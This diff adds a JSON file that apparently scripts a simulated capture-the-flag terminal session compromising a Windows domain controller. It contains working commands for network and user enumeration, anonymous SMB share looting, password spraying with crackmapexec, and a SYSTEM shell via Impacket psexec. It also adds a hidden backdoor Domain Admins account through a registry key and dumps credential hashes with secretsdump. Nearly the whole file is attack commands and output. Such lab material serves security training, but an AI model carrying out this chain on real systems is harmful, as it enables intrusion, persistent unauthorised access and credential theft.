@@ -1,0 +1,538 @@
+[
+    {
+        "type": "input",
+        "text": "nmap -sn 10.0.0.0/24"
+    },
+    {
+        "type": "output",
+        "text": "Starting Nmap 7.94 ( https://nmap.org )"
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 10.0.0.1"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.001s latency)."
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.015s latency)."
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 10.0.0.25"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.023s latency)."
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 10.0.0.30"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.012s latency)."
+    },
+    {
+        "type": "input",
+        "text": "nmap -sS -A 10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "Starting Nmap 7.94"
+    },
+    {
+        "type": "output",
+        "text": "PORT     STATE SERVICE       VERSION"
+    },
+    {
+        "type": "output",
+        "text": "53/tcp   open  domain          Microsoft DNS 6.1.7601"
+    },
+    {
+        "type": "output",
+        "text": "88/tcp   open  kerberos-sec    Microsoft Windows Kerberos"
+    },
+    {
+        "type": "output",
+        "text": "135/tcp  open  msrpc           Microsoft Windows RPC"
+    },
+    {
+        "type": "output",
+        "text": "139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn"
+    },
+    {
+        "type": "output",
+        "text": "389/tcp  open  ldap            Microsoft Windows Active Directory LDAP"
+    },
+    {
+        "type": "output",
+        "text": "445/tcp  open  microsoft-ds    Windows Server 2019 Standard"
+    },
+    {
+        "type": "output",
+        "text": "464/tcp  open  kpasswd5?"
+    },
+    {
+        "type": "output",
+        "text": "593/tcp  open  ncacn_http      Microsoft Windows RPC over HTTP 1.0"
+    },
+    {
+        "type": "output",
+        "text": "636/tcp  open  tcpwrapped"
+    },
+    {
+        "type": "output",
+        "text": "3268/tcp open  ldap            Microsoft Windows Active Directory LDAP"
+    },
+    {
+        "type": "output",
+        "text": "3269/tcp open  tcpwrapped"
+    },
+    {
+        "type": "output",
+        "text": "3389/tcp open  ms-wbt-server   Microsoft Terminal Services"
+    },
+    {
+        "type": "output",
+        "text": "OS: Windows Server 2019 Standard 17763"
+    },
+    {
+        "type": "input",
+        "text": "enum4linux -a 10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "Starting enum4linux v0.8.9"
+    },
+    {
+        "type": "output",
+        "text": "Target Information"
+    },
+    {
+        "type": "output",
+        "text": "Target ........... 10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "RID Range ........ 500-550, 1000-1050"
+    },
+    {
+        "type": "output",
+        "text": "Username ......... ''"
+    },
+    {
+        "type": "output",
+        "text": "Password ......... ''"
+    },
+    {
+        "type": "output",
+        "text": "Known Usernames .. administrator, guest, krbtgt, domain admins"
+    },
+    {
+        "type": "output",
+        "text": "S-1-5-21-1234567890-987654321-1122334455-500 CORP\\Administrator (Local User)"
+    },
+    {
+        "type": "output",
+        "text": "S-1-5-21-1234567890-987654321-1122334455-501 CORP\\Guest (Local User)"
+    },
+    {
+        "type": "output",
+        "text": "S-1-5-21-1234567890-987654321-1122334455-502 CORP\\krbtgt (Local User)"
+    },
+    {
+        "type": "output",
+        "text": "S-1-5-21-1234567890-987654321-1122334455-1001 CORP\\john.doe (Local User)"
+    },
+    {
+        "type": "output",
+        "text": "S-1-5-21-1234567890-987654321-1122334455-1002 CORP\\jane.smith (Local User)"
+    },
+    {
+        "type": "input",
+        "text": "smbclient -L //10.0.0.15 -N"
+    },
+    {
+        "type": "output",
+        "text": "Sharename       Type      Comment"
+    },
+    {
+        "type": "output",
+        "text": "---------       ----      -------"
+    },
+    {
+        "type": "output",
+        "text": "ADMIN$          Disk      Remote Admin"
+    },
+    {
+        "type": "output",
+        "text": "C$              Disk      Default share"
+    },
+    {
+        "type": "output",
+        "text": "IPC$            IPC       Remote IPC"
+    },
+    {
+        "type": "output",
+        "text": "NETLOGON        Disk      Logon server share"
+    },
+    {
+        "type": "output",
+        "text": "SYSVOL          Disk      Logon server share"
+    },
+    {
+        "type": "output",
+        "text": "backup          Disk      Company Backup Files"
+    },
+    {
+        "type": "input",
+        "text": "smbclient //10.0.0.15/backup -N"
+    },
+    {
+        "type": "output",
+        "text": "Try \"help\" to get a list of possible commands."
+    },
+    {
+        "type": "input",
+        "text": "ls"
+    },
+    {
+        "type": "output",
+        "text": "  .                                   D        0  Mon Jan 15 10:30:42 2025"
+    },
+    {
+        "type": "output",
+        "text": "  ..                                  D        0  Mon Jan 15 10:30:42 2025"
+    },
+    {
+        "type": "output",
+        "text": "  passwords.txt                       A     1024  Mon Jan 15 10:25:15 2025"
+    },
+    {
+        "type": "output",
+        "text": "  users.csv                           A     2048  Mon Jan 15 10:20:30 2025"
+    },
+    {
+        "type": "input",
+        "text": "get passwords.txt"
+    },
+    {
+        "type": "output",
+        "text": "getting file \\passwords.txt of size 1024 as passwords.txt (500.0 KiloBytes/sec)"
+    },
+    {
+        "type": "input",
+        "text": "get users.csv"
+    },
+    {
+        "type": "output",
+        "text": "getting file \\users.csv of size 2048 as users.csv (1000.0 KiloBytes/sec)"
+    },
+    {
+        "type": "input",
+        "text": "exit"
+    },
+    {
+        "type": "input",
+        "text": "cat passwords.txt"
+    },
+    {
+        "type": "output",
+        "text": "# Common passwords found in company"
+    },
+    {
+        "type": "output",
+        "text": "admin"
+    },
+    {
+        "type": "output",
+        "text": "password"
+    },
+    {
+        "type": "output",
+        "text": "Password123!"
+    },
+    {
+        "type": "output",
+        "text": "P@ssw0rd123!"
+    },
+    {
+        "type": "output",
+        "text": "Welcome123"
+    },
+    {
+        "type": "output",
+        "text": "Company2025!"
+    },
+    {
+        "type": "input",
+        "text": "cat users.csv"
+    },
+    {
+        "type": "output",
+        "text": "username,department,email"
+    },
+    {
+        "type": "output",
+        "text": "administrator,IT,admin@corp.local"
+    },
+    {
+        "type": "output",
+        "text": "john.doe,HR,john.doe@corp.local"
+    },
+    {
+        "type": "output",
+        "text": "jane.smith,Finance,jane.smith@corp.local"
+    },
+    {
+        "type": "output",
+        "text": "mike.wilson,IT,mike.wilson@corp.local"
+    },
+    {
+        "type": "input",
+        "text": "crackmapexec smb 10.0.0.15 -u administrator -p passwords.txt"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [-] CORP\\administrator:admin STATUS_LOGON_FAILURE"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [-] CORP\\administrator:password STATUS_LOGON_FAILURE"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [-] CORP\\administrator:Password123! STATUS_LOGON_FAILURE"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [+] CORP\\administrator:P@ssw0rd123!"
+    },
+    {
+        "type": "input",
+        "text": "crackmapexec smb 10.0.0.15 -u users.csv -p P@ssw0rd123! --continue-on-success"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [+] CORP\\administrator:P@ssw0rd123! (Pwn3d!)"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [-] CORP\\john.doe:P@ssw0rd123! STATUS_LOGON_FAILURE"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [+] CORP\\jane.smith:P@ssw0rd123!"
+    },
+    {
+        "type": "output",
+        "text": "SMB         10.0.0.15       445    DC01             [-] CORP\\mike.wilson:P@ssw0rd123! STATUS_LOGON_FAILURE"
+    },
+    {
+        "type": "input",
+        "text": "python3 /opt/impacket/examples/psexec.py CORP/administrator:P@ssw0rd123!@10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation"
+    },
+    {
+        "type": "output",
+        "text": "[*] Requesting shares on 10.0.0.15....."
+    },
+    {
+        "type": "output",
+        "text": "[*] Found writable share ADMIN$"
+    },
+    {
+        "type": "output",
+        "text": "[*] Uploading file nCGTIOcR.exe"
+    },
+    {
+        "type": "output",
+        "text": "[*] Opening SVCManager on 10.0.0.15....."
+    },
+    {
+        "type": "output",
+        "text": "[*] Creating service QQmh on 10.0.0.15....."
+    },
+    {
+        "type": "output",
+        "text": "[*] Starting service QQmh....."
+    },
+    {
+        "type": "output",
+        "text": "[!] Press help for extra shell commands"
+    },
+    {
+        "type": "output",
+        "text": "Microsoft Windows [Version 10.0.17763.1697]"
+    },
+    {
+        "type": "output",
+        "text": "(c) 2018 Microsoft Corporation. All rights reserved."
+    },
+    {
+        "type": "input",
+        "text": "whoami"
+    },
+    {
+        "type": "output",
+        "text": "nt authority\\system"
+    },
+    {
+        "type": "input",
+        "text": "net user"
+    },
+    {
+        "type": "output",
+        "text": "User accounts for \\\\DC01"
+    },
+    {
+        "type": "output",
+        "text": "-------------------------------------------------------------------------------"
+    },
+    {
+        "type": "output",
+        "text": "Administrator            DefaultAccount           Guest"
+    },
+    {
+        "type": "output",
+        "text": "jane.smith               john.doe                 krbtgt"
+    },
+    {
+        "type": "output",
+        "text": "mike.wilson"
+    },
+    {
+        "type": "input",
+        "text": "net user hacker P@ssw0rd123! /add"
+    },
+    {
+        "type": "output",
+        "text": "The command completed successfully."
+    },
+    {
+        "type": "input",
+        "text": "net localgroup administrators hacker /add"
+    },
+    {
+        "type": "output",
+        "text": "The command completed successfully."
+    },
+    {
+        "type": "input",
+        "text": "net localgroup \"Domain Admins\" hacker /add"
+    },
+    {
+        "type": "output",
+        "text": "The command completed successfully."
+    },
+    {
+        "type": "input",
+        "text": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f"
+    },
+    {
+        "type": "output",
+        "text": "The operation completed successfully."
+    },
+    {
+        "type": "input",
+        "text": "dir C:\\Users\\Administrator\\Desktop"
+    },
+    {
+        "type": "output",
+        "text": "Volume in drive C has no label."
+    },
+    {
+        "type": "output",
+        "text": " Directory of C:\\Users\\Administrator\\Desktop"
+    },
+    {
+        "type": "output",
+        "text": "01/15/2025  02:30 PM    <DIR>          ."
+    },
+    {
+        "type": "output",
+        "text": "01/15/2025  02:30 PM    <DIR>          .."
+    },
+    {
+        "type": "output",
+        "text": "01/15/2025  02:30 PM                42 flag.txt"
+    },
+    {
+        "type": "output",
+        "text": "01/15/2025  02:25 PM             1,024 passwords.txt"
+    },
+    {
+        "type": "output",
+        "text": "               2 File(s)          1,066 bytes"
+    },
+    {
+        "type": "input",
+        "text": "type C:\\Users\\Administrator\\Desktop\\flag.txt"
+    },
+    {
+        "type": "output",
+        "text": "CTF{d0m41n_4dm1n_c0mpr0m153d_5ucc355fully!}"
+    },
+    {
+        "type": "input",
+        "text": "python3 /opt/impacket/examples/secretsdump.py CORP/administrator:P@ssw0rd123!@10.0.0.15"
+    },
+    {
+        "type": "output",
+        "text": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation"
+    },
+    {
+        "type": "output",
+        "text": "[*] Service RemoteRegistry is in stopped state"
+    },
+    {
+        "type": "output",
+        "text": "[*] Starting service RemoteRegistry"
+    },
+    {
+        "type": "output",
+        "text": "[*] Target system bootKey: 0x12345678901234567890123456789012"
+    },
+    {
+        "type": "output",
+        "text": "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
+    },
+    {
+        "type": "output",
+        "text": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
+    },
+    {
+        "type": "output",
+        "text": "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
+    },
+    {
+        "type": "output",
+        "text": "[*] Dumping cached domain logon information (domain/username:hash)"
+    },
+    {
+        "type": "output",
+        "text": "CORP.LOCAL/john.doe:$DCC2$10240#john.doe#e4e938d12fe5974dc42a90120bd9c90f"
+    },
+    {
+        "type": "output",
+        "text": "CORP.LOCAL/jane.smith:$DCC2$10240#jane.smith#8846f7eaee8fb117ad06bdd830b7586c"
+    },
+    {
+        "type": "input",
+        "text": "exit"
+    }
+]
